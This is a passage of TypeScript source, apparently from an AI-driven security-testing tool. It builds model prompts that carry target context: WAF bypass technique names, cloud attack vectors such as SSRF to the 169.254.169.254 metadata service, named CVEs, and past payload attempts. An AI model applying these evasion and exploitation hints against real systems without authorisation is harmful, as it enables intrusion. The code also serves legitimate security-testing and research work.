    const report = await this.complete(prompt, systemPrompt, provider);

    logger.info(
      { programName: data.programName, findings: data.findings.length },
      'Generated security report'
    );

    return report;
  }

  /**
   * ENHANCED: Context-aware prompt engineering
   * Builds optimized prompts based on target context
   */
  buildContextAwarePrompt(
    baseTask: string,
    context: {
      techStack?: string[];
      waf?: string;
      cloudProvider?: string;
      pastAttempts?: Array<{ payload: string; result: string }>;
      knownVulnerabilities?: string[];
    }
  ): string {
    let prompt = baseTask + '\n\n**Context:**\n';

    if (context.techStack && context.techStack.length > 0) {
      prompt += `- Tech Stack: ${context.techStack.join(', ')}\n`;
      prompt += `- Known vulnerabilities in stack: ${this.getStackVulnerabilities(context.techStack).join(', ')}\n`;
    }

    if (context.waf) {
      prompt += `- WAF Detected: ${context.waf}\n`;
      prompt += `- Bypass techniques: ${this.getWAFBypassTechniques(context.waf).join(', ')}\n`;
    }

    if (context.cloudProvider) {
      prompt += `- Cloud Provider: ${context.cloudProvider}\n`;
      prompt += `- Cloud-specific attacks: ${this.getCloudAttackVectors(context.cloudProvider).join(', ')}\n`;
    }

    if (context.pastAttempts && context.pastAttempts.length > 0) {
      prompt += '\n**Past Attempts (Learn from these):**\n';
      context.pastAttempts.forEach((attempt, i) => {
        prompt += `${i + 1}. Payload: ${attempt.payload}\n   Result: ${attempt.result}\n`;
      });
    }

    return prompt;
  }

  /**
   * Get known vulnerabilities for tech stack
   */
  private getStackVulnerabilities(techStack: string[]): string[] {
    const vulns: string[] = [];
    techStack.forEach((tech) => {
      const techLower = tech.toLowerCase();
      if (techLower.includes('wordpress')) vulns.push('Plugin vulnerabilities', 'XML-RPC attacks');
      if (techLower.includes('apache')) vulns.push('Path traversal (CVE-2021-41773)');
      if (techLower.includes('nginx')) vulns.push('Integer overflow (CVE-2021-23017)');
      if (techLower.includes('mysql')) vulns.push('SQL injection', 'Privilege escalation');
      if (techLower.includes('redis')) vulns.push('Unauthenticated access', 'Command injection');
    });
    return vulns;
  }

  /**
   * Get WAF bypass techniques
   */
  private getWAFBypassTechniques(waf: string): string[] {
    const techniques: Record<string, string[]> = {
      cloudflare: ['Header smuggling', 'Origin IP discovery', 'Cache poisoning'],
      'aws waf': ['Regional endpoint bypass', 'Rate limit evasion', 'Rule exceptions'],
      akamai: ['True-Client-IP spoofing', 'Forward-For manipulation'],
      imperva: ['SSL/TLS evasion', 'Encoding variations', 'Fragment attacks'],
    };
    return techniques[waf.toLowerCase()] || ['Encoding', 'Case variation', 'Comment injection'];
  }

  /**
   * Get cloud-specific attack vectors
   */
  private getCloudAttackVectors(provider: string): string[] {
    const vectors: Record<string, string[]> = {
      aws: ['SSRF to metadata (169.254.169.254)', 'IAM role escalation', 'S3 bucket enumeration'],
      gcp: ['Metadata API access', 'Service account abuse', 'Cloud Storage misconfig'],
      azure: [
        'Managed Identity exploitation',
        'Blob Storage exposure',
        'Key Vault access',
      ],
    };
    return vectors[provider.toLowerCase()] || [];
  }
}

// Singleton instance
const llmEngine = new LLMEngine();

export default llmEngine;
